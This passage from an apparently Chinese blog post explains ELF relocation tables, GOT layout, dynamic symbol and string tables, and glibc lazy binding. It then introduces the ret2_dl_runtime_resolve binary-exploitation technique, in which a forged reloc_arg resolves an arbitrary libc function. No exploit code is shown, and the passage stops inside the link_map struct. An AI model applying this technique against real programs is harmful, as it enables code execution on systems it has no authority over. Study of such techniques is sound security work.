class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)  ((val) &amp; 0xff) </span></span><br><span class="line"><span class="comment">//通过R_SYM和R_Type重组r_info</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)  (((sym) &lt;&lt; 8) + ((type) &amp; 0xff)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得高32位，表示在符号表中的下标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)  ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">//获得低32位，表示重定位类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)  ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="comment">//通过R_SYM和R_Type重组r_info</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)  ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>32位ELF</code></strong>一般使用的<code>重定位表项</code>的结构体是<strong><code>Elf32_Rel</code></strong>，其中包含<code>r_offset</code>和<code>r_info</code>两个成员，都是<code>4byte</code>类型的变量。<strong><code>r_offset：</code></strong>表示重定位所<code>作用的位置</code>。对于<code>重定位文件(.o)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>在<code>其所在节</code>中的<code>字节偏移量</code>；对于<code>可执行文件</code>或<code>共享目标文件(.so)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>的<code>虚拟地址</code>。<strong><code>r_info：</code></strong>其<code>高24位</code>表示该重定位项在<code>动态链接符号表.dynsym</code>中对应项的<code>下标</code>，<code>低8位</code>表示该重定位项的<code>重定向类型</code>。<br>&emsp;&emsp;<strong><code>64位ELF</code></strong>一般使用的<code>重定位表项</code>的结构体是<strong><code>Elf64_Rela</code></strong>，其中包含<code>r_offset</code>、<code>r_info</code>和<code>r_addend</code>三个成员，都是<code>8byte</code>类型的变量。<strong><code>r_offset：</code></strong>表示重定位所<code>作用的位置</code>。对于<code>重定位文件(.o)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>在<code>其所在节</code>中的<code>字节偏移量</code>；对于<code>可执行文件</code>或<code>共享目标文件(.so)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>的<code>虚拟地址</code>。<strong><code>r_info：</code></strong>其<code>高32位</code>表示该重定位项在<code>动态链接符号表.dynsym</code>中对应项的<code>下标</code>，<code>低32位</code>表示该重定位项的<code>重定向类型</code>。<strong><code>r_addend：</code></strong>此成员指定<code>常量加数</code>，用于计算将存储在<code>可重定位字段中的值</code>。<code>Elf32_Rela</code>中是用r_addend<code>显式</code>地指出加数;而对 <code>Elf32_Rel</code>来说,加数是<code>隐含</code>在被修改的位置里的。在<code>所有情况</code>下，<code>加数</code>和<code>计算所得的结果</code>使用相同的<code>字节顺序</code>。<code>加数值</code>的<code>重定位项类型</code>和<code>解释</code>由特定于平台的 ABI 定义。<br>&emsp;&emsp;<code>重定位节</code>可以引用其他两个节：<code>符号表</code>（由 <code>sh_link</code> 节头项标识）和<code>要修改的节</code>（由 <code>sh_info</code> 节头项标识）。节中指定了这些关系。如果<code>可重定位目标文件</code>中存在<code>重定位节</code>，则需要 <code>sh_info</code> 项，但对于<code>可执行文件</code>和<code>共享目标文件</code>，该项是<code>可选的</code>。<code>重定位偏移(r_offset)</code>满足执行重定位的要求。<code>不同的ELF文件</code>中,重定位项的 <code>r_offset</code> 成员的<code>含义</code>略有不同,但其重定位的<code>作用</code>是不变的。<br>&emsp;&emsp;在所有情况下，<code>r_offset</code> 值都会指定<code>受影响存储单元</code>的<code>第一个字节</code>的<code>偏移</code>或<code>虚拟地址</code>。<code>重定位类型</code>可指定<code>要更改的位</code>以及<code>计算这些位的值</code>的方法。</p><blockquote><ul><li>1、<strong><code>重定位文件(.o)</code></strong>中,<code>r_offset</code> 成员含有一个<code>节偏移量</code>。也就是说,重定位节本身描述的是如何修改文件中的另一个节的内容,重定位偏移量(r_offset)指向了另一个节中的一个存储单元地址。 [<a href="#Ref2">2</a>]</li><li>2、在<strong><code>可执行文件</code></strong>或<strong><code>共享目标文件(.so)</code></strong>中,<code>r_offset</code> 含有的是<code>符号定义</code>在进程空间中的<code>虚拟地址</code>。<code>可执行文件</code>和<code>共享目标文件</code>是用于<code>运行程序</code>而不是<code>构建程序</code>的,所以对它们来说更有用的信息是运行期的内存虚拟地址,而不是某个符号定义在文件中的位置。[<a href="#Ref2">2</a>]</li></ul></blockquote><p><strong><code>重定位类型(Relocation Types)</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* i386 relocs.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_NONE     0  <span class="comment">/* No reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_32       1  <span class="comment">/* Direct 32 bit  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_PC32     2  <span class="comment">/* PC relative 32 bit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_GOT32    3  <span class="comment">/* 32 bit GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_PLT32    4  <span class="comment">/* 32 bit PLT address */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_COPY     5  <span class="comment">/* Copy symbol at runtime */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_GLOB_DAT 6  <span class="comment">/* Create GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_JMP_SLOT 7  <span class="comment">/* Create PLT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_RELATIVE 8  <span class="comment">/* Adjust by program base */</span></span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">/* AMD x86-64 relocations.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_NONE      0  <span class="comment">/* No reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_64        1  <span class="comment">/* Direct 64 bit  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_PC32      2  <span class="comment">/* PC relative 32 bit signed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GOT32     3  <span class="comment">/* 32 bit GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_PLT32     4  <span class="comment">/* 32 bit PLT address */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_COPY      5  <span class="comment">/* Copy symbol at runtime */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GLOB_DAT  6  <span class="comment">/* Create GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_JUMP_SLOT 7  <span class="comment">/* Create PLT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_RELATIVE  8  <span class="comment">/* Adjust by program base */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GOTPCREL  9  <span class="comment">/* 32 bit signed PC relative offset to GOT */</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>32位ELF</code></strong>一般用来函数重定位的重定位类型就是<code>R_386_JMP_SLOT</code>类型,<strong><code>64位ELF</code></strong>函数重定位的重定位类型就是<code>R_X86_64_JUMP_SLOT</code>类型，源码对其的注释是<code>Create PLT entry</code>。这种类型的<code>函数重定位</code>都会在ELF中创建一个<code>PLT入口</code>。</p><h3 id="2-4、“-got”段和“-got-plt”段"><a href="#2-4、“-got”段和“-got-plt”段" class="headerlink" title="2.4、“.got”段和“.got.plt”段"></a>2.4、“.got”段和“.got.plt”段</h3><p><strong><code>GOT表</code></strong>在ELF文件中分为<code>两个部分</code>：</p><blockquote><ul><li><strong><code>.got</code></strong>：存储对<code>全局变量</code>的引用。</li><li><strong><code>.got.plt</code></strong>：存储对<code>函数</code>的引用。</li></ul></blockquote><p>前面讲<code>延迟绑定</code>的时候讲过，<strong><code>.got.plt</code></strong>的<code>前三项</code>具有特殊的含义：</p><blockquote><ul><li><strong><code>GOT[0]</code></strong>：保存的是<code>“.dynamic”段</code>的地址。</li><li><strong><code>GOT[1]</code></strong>：保存的是<code>本模块的ID</code>。指向内部类型为<code>link_map的指针</code>，只会在<code>动态链接器</code>中使用，包含了进行<code>符号解析</code>需要的<code>当前ELF共享目标文件</code>的信息。每个 <code>link_map</code>都是一条<code>双向链表</code>的一个节点，而这个链表保存了所有加载的<code>ELF共享目标文件</code>的信息。<code>动态链接器</code>利用<code>该地址</code>来对<code>符号</code>进行解析。</li><li><strong><code>GOT[2]</code></strong>：保存的是<code>_dl_runtime_resolve()</code>的地址。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>解析之前</code></strong>，GOT表的<code>其他表项</code>存储的是所解析函数对应的<code>PLT表项第二条指令的地址</code>。<strong><code>解析之后</code></strong>，存储的是<code>函数的真实地址</code>。</p><h3 id="2-5、“-dynsym”段"><a href="#2-5、“-dynsym”段" class="headerlink" title="2.5、“.dynsym”段"></a>2.5、“.dynsym”段</h3><p>&emsp;&emsp;<strong><code>“.dynsym”段</code></strong>是<code>动态链接符号表</code>。这里保存的是一个<code>结构体数组</code>，结构体的<code>定义</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word    st_name;  <span class="comment">/* 符号名，符号在字符串表中的偏移 */</span></span><br><span class="line">    Elf32_Addr    st_value; <span class="comment">/* 符号的值，可能是地址或偏移 */</span></span><br><span class="line">    Elf32_Word    st_size;  <span class="comment">/* 符号的大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">/* 符号类型及绑定属性 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">/* 符号的可见性 */</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">/* 节头表索引 */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  Elf64_Word    st_name;  <span class="comment">/* 符号名，符号在字符串表中的偏移 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">/* 符号类型及绑定属性 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">/* 符号的可见性 */</span></span><br><span class="line">  Elf64_Section st_shndx; <span class="comment">/* 节头表索引 */</span></span><br><span class="line">  Elf64_Addr    st_value; <span class="comment">/* 符号的值，可能是地址或偏移 */</span></span><br><span class="line">  Elf64_Xword   st_size;  <span class="comment">/* 符号的大小 */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* st_info字段中符号类型和绑定属性的提取 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"><span class="comment">/* Elf32_Sym和Elf64_Sym都使用相同的一字节的st_info字段 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们主要关注此结构体中的<strong><code>两个成员</code></strong>(注意<code>32位</code>和<code>64位</code>中这两个值在结构体里的<code>位置</code>不一样！)</p><blockquote><ul><li><strong><code>st_name</code></strong>：该成员保存着符号在<code>.dynstr表</code>（动态链接字符串表）中的<code>偏移</code>。</li><li><strong><code>st_value</code></strong>：如果这个符号<code>被导出</code>，这个符号保存着对应的<code>虚拟地址</code>。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>st_other</code></strong>：st_other 变量定义了<code>符号的可见性</code>。</p><p><strong><code>符号可见性规范</code></strong>：<a href="https://www.ibm.com/developerworks/cn/aix/library/au-aix-symbol-visibility/" target="_blank" rel="noopener">第 1 部分 - 符号可见性简介</a></p><blockquote><ul><li><strong><code>STV_DEFAULT(0)</code></strong>：默认符号可见性规则。用它定义的符号将被导出。换句话说，它声明符号是到处可见的。</li><li><strong><code>STV_INTERNAL(1)</code></strong>：特定于处理器的隐藏类。符号在当前可执行文件或共享库之外不可访问。</li><li><strong><code>STV_HIDDEN(2)</code></strong>：Sym在其他模块中不可用。用它定义的符号将不被导出，并且不能从其他对象进行使用。</li><li><strong><code>STV_PROTECTED(3)</code></strong>：不可抢占，不可导出。符号在当前可执行文件或共享对象之外可见，但是不会被覆盖。换句话说，如果共享库中的一个受保护符号被该共享库中的另一个代码引用，那么此代码将总是引用共享库中的此符号，即便可执行文件定义了相同名称的符号。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>st_shndx</code></strong>：每个<code>符号表条目的定义</code>都与<code>某些节</code>对应。<code>st_shndx</code>变量保存了相关<code>节头表的索引</code>。</p><p><strong><code>特殊节索引</code></strong>：<a href="https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-94076/index.html" target="_blank" rel="noopener">Linker and Libraries Guide</a></p><table><thead><tr><th style="text-align:left">宏定义</th><th style="text-align:center">值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">SHN_UNDEF</td><td style="text-align:center">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  0x0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</td><td style="text-align:left">未定义的、丢失的、不相关的或其他没有意义的节引用。例如，相对于节号SHN_UNDEF定义的符号是未定义的符号。该符号在本目标文件中被引用到，但是定义在其他目标文件中。</td></tr><tr><td style="text-align:left">SHN_LORESERVE</td><td style="text-align:center">0xFF00</td><td style="text-align:left">被保留索引号区间的下限。</td></tr><tr><td style="text-align:left">SHN_LOPROC</td><td style="text-align:center">0xFF00</td><td style="text-align:left">为特定处理器定制节所保留的索引号区间的下限。</td></tr><tr><td style="text-align:left">SHN_BEFORE</td><td style="text-align:center">0xFF00</td><td style="text-align:left">优先于其他节的排序节(Solaris)。与SHF_LINK_ORDER和SHF_ORDERED节标志一起规定初始和最终节顺序。</td></tr><tr><td style="text-align:left">SHN_AFTER</td><td style="text-align:center">0xFF01</td><td style="text-align:left">在其他节之后的排序节(Solaris)。与SHF_LINK_ORDER和SHF_ORDERED节标志一起规定初始和最终节顺序。</td></tr><tr><td style="text-align:left">SHN_HIPROC</td><td style="text-align:center">0xFF1F</td><td style="text-align:left">为特定处理器定制节所保留的索引号区间的上限。</td></tr><tr><td style="text-align:left">SHN_LOOS</td><td style="text-align:center">0xFF20</td><td style="text-align:left">为特定操作系统定制节所保留的索引号区间的下限。</td></tr><tr><td style="text-align:left">SHN_HIOS</td><td style="text-align:center">0xFF3F</td><td style="text-align:left">为特定操作系统定制节所保留的索引号区间的上限。</td></tr><tr><td style="text-align:left">SHN_ABS</td><td style="text-align:center">0xFFF1</td><td style="text-align:left">此节中所定义的符号有绝对的值,这个值不会因重定位而改变。</td></tr><tr><td style="text-align:left">SHN_COMMON</td><td style="text-align:center">0xFFF2</td><td style="text-align:left">相对于这个节定义的符号是公共符号，例如FORTRAN的COMMON块或未分配的C外部变量。这些符号有时被称为暂定符号。表示该符号是一个”COMMON块”的符号，一般来说，未初始化的全局符号定义就是这种类型的。</td></tr><tr><td style="text-align:left">SHN_XINDEX</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">溢出值，指示实际的节头索引太大，所以存储在别处。当节头项中e_shstrndx的值是SHN_XINDEX时，表明真实的节头表索引值存储在第一个节头表表项(即节头表索引值为0)的成员sh_link中。</td></tr><tr><td style="text-align:left">SHN_HIRESERVE</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">被保留索引号区间的上限。</td></tr></tbody></table><p>&emsp;&emsp;<strong><code>st_info</code></strong>指定<code>符号类型</code>及<code>绑定属性</code>。st_info的<strong><code>低四位</code></strong>表示<code>符号类型</code>，<strong><code>高四位</code></strong>表示<code>绑定属性</code>。符号类型以<code>STT</code>开头，符号绑定以<code>STB</code>开头，下面对几种常见的符号类型和符号绑定进行介绍。</p><p>1、<strong><code>符号类型</code></strong></p><blockquote><ul><li><strong><code>STT_NOTYPE(0)</code></strong>：符号类型<code>未定义</code>。</li><li><strong><code>STT_OBJECT(1)</code></strong>：表示该符号与<code>数据目标文件</code>关联。</li><li><strong><code>STT_FUNC(2)</code></strong>：表示该符号与<code>函数</code>或者<code>其他可执行代码</code>关联。</li></ul></blockquote><p>2、<strong><code>绑定属性</code></strong></p><blockquote><ul><li><strong><code>STB_LOCAL(0)</code></strong>：<code>本地符号</code>在<code>目标文件</code>之外是不可见的，<code>目标文件</code>包含了<code>符号的定义</code>，如一个声明为static的函数。</li><li><strong><code>STB_GLOBAL(1)</code></strong>：<code>全局符号</code>对于所有<code>要合并的目标文件</code>来说都是可见的。一个全局符号在<code>一个文件</code>中进行定义后，<code>另外一个文件</code>可以对这个符号进行引用。</li><li><strong><code>STB_WEAK(2)</code></strong>：与<code>全局绑定</code>类似，不过比<code>STB_GLOBAL</code>的<code>优先级低</code>。<code>被标记</code>为<code>STB_WEAK</code>的符号有可能会被<code>同名</code>的<code>未被标记</code>为<code>STB_WEAK</code>的符号<code>覆盖</code>。</li></ul></blockquote><h3 id="2-6、“-dynstr”段"><a href="#2-6、“-dynstr”段" class="headerlink" title="2.6、“.dynstr”段"></a>2.6、“.dynstr”段</h3><p>&emsp;&emsp;<strong><code>“.dynstr”</code></strong>是<code>动态链接字符串表</code>。其<code>第一个字节</code>为0，然后包含<code>动态链接</code>所需的字符串(导入函数名等)(<code>以\x00结尾</code>)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.dynstr:08048260 _dynstr segment byte public &apos;&apos; use32</span><br><span class="line">.dynstr:08048260         assume cs:_dynstr</span><br><span class="line">.dynstr:08048260         ;org 8048260h</span><br><span class="line">.dynstr:08048260         assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">.dynstr:08048260 byte_8048260    db 0             </span><br><span class="line">.dynstr:08048261 aGmonStart      db &apos;__gmon_start__&apos;,0   </span><br><span class="line">.dynstr:08048270 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">.dynstr:0804827A aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   </span><br><span class="line">.dynstr:08048289 aStrncmp        db &apos;strncmp&apos;,0          </span><br><span class="line">.dynstr:08048291 aStrlen         db &apos;strlen&apos;,0           </span><br><span class="line">.dynstr:08048298 aRead           db &apos;read&apos;,0             </span><br><span class="line">.dynstr:0804829D aLibcStartMain  db &apos;__libc_start_main&apos;,0 </span><br><span class="line">.dynstr:080482AF aWrite          db &apos;write&apos;,0            </span><br><span class="line">.dynstr:080482B5 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">.dynstr:080482BF                 align 10h</span><br><span class="line">.dynstr:080482BF _dynstr ends</span><br></pre></td></tr></table></figure></p><h2 id="3、ret2-dl-runtime-resolve利用原理"><a href="#3、ret2-dl-runtime-resolve利用原理" class="headerlink" title="3、ret2_dl_runtime_resolve利用原理"></a>3、ret2_dl_runtime_resolve利用原理</h2><h3 id="3-1、函数调用流程"><a href="#3-1、函数调用流程" class="headerlink" title="3.1、函数调用流程"></a>3.1、函数调用流程</h3><p>&emsp;&emsp;动态链接下<code>第一次调用</code>glibc的函数需要通过<code>PLT表</code>中的一段代码<code>解析函数的真实地址</code>，这也是ELF的<code>延迟绑定</code>的特点。具体的解析方式就是通过调用<strong><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code></strong> ，如果我们可以<code>控制</code>整个解析过程中的<code>参数</code>，那么就能解析<code>我们想要的函数地址</code>。以调用<code>printf函数</code>为例，回顾一下整个流程：</p><blockquote><ul><li>1、<strong><code>call printf@PLT</code></strong></li><li>2、<strong><code>jmp *(printf@GOT)</code></strong> -&gt; (第一次会jmp回来，解析之后就直接jmp到解析出来的地址了) -&gt; <strong><code>push n</code></strong> -&gt; <strong><code>jmp &amp;PLT[0]</code></strong> (跳到公共表项)</li><li>3、<strong><code>push GOT[1]</code></strong> (link_map可以理解为模块ID) -&gt; <strong><code>jmp *GOT[2]</code></strong> (跳转到_dl_runtime_resolve函数)<br>以上步骤相当于调用了<strong><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code></strong></li><li>4、<strong><code>解析完毕</code></strong>后会把解析出来的地址<code>写回</code>reloc_arg定位到的<code>.rel.plt表项中r_offset指向的位置</code>(其实就是<code>.got.plt</code>的对应项)</li></ul></blockquote><p>&emsp;&emsp;弄懂<code>_dl_runtime_resolve()</code>的解析过程后，就可以通过<code>伪造reloc_arg</code>来解析出<code>我们想要的libc函数地址</code>并且<code>写回可控区域</code>了。</p><h3 id="3-2、-dl-runtime-resolve-link-map-obj-reloc-arg-解析流程"><a href="#3-2、-dl-runtime-resolve-link-map-obj-reloc-arg-解析流程" class="headerlink" title="3.2、_dl_runtime_resolve(link_map_obj, reloc_arg)解析流程"></a>3.2、_dl_runtime_resolve(link_map_obj, reloc_arg)解析流程</h3><blockquote><ul><li>1、通过<code>link_map_obj</code>访问<strong><code>“.dynamic”段</code></strong>，分别取出<code>动态链接字符串表“.dynstr”</code>、<code>动态链接符号表“.dynsym”</code>、<code>重定位表“.rel.plt”的地址</code>。记为<strong><code>dynstr_addr</code></strong>、<strong><code>dynsym_addr</code></strong>、<strong><code>rel_plt_addr</code></strong>。</li><li>2、利用<strong><code>rel_plt_addr + reloc_index</code></strong>，求出<code>当前函数</code>重定位表项Elf32_Rel的指针，记为<strong><code>rel</code></strong>。</li><li>3、<code>rel-&gt;r_info</code>的<code>高24位</code>作为<code>动态链接符号表“.dynsym”</code>的下标，即利用<strong><code>dynsym_addr + ((rel-&gt;r_info)&gt;&gt;8)</code></strong>，求出<code>当前函数</code>动态链接符号表项Elf32_Sym的指针，记作<strong><code>sym</code></strong>。</li><li>4、<code>sym -&gt; st_name</code>作为<code>动态链接字符串表“.dynstr”</code>的下标，即利用<strong><code>dynstr_addr + (sym -&gt; st_name)</code></strong>，求出<code>当前函数</code>动态链接字符串表项在的指针，记作<strong><code>str</code></strong>。</li><li>5、在<code>动态链接库</code>查找这个函数的地址，并且把<code>找到的地址</code>赋值给<strong><code>rel-&gt;r_offset</code></strong>，即<strong><code>.got.plt</code></strong>中此函数的对应项。</li><li>6、最后<code>调用这个函数</code>。</li></ul></blockquote><h4 id="3-2-0、link-map结构体定义"><a href="#3-2-0、link-map结构体定义" class="headerlink" title="3.2.0、link_map结构体定义"></a>3.2.0、link_map结构体定义</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link_map.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 描述加载的共享库的结构体。“l_next”和“l_prev”成员构成了启动时加载的所有共享对象的链表。</span></span><br><span class="line"><span class="comment">   这些数据结构存在于运行时动态链接器使用的空间中。 修改它们可能会导致灾难性的后果。 如有</span></span><br><span class="line"><span class="comment">   必要，此数据结构将来可能会更改。 用户级程序必须避免定义这种类型的对象。 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 这些最初的几个成员是调试器协议的一部分。 这与SVR4中使用的格式相同。 */</span></span><br><span class="line">    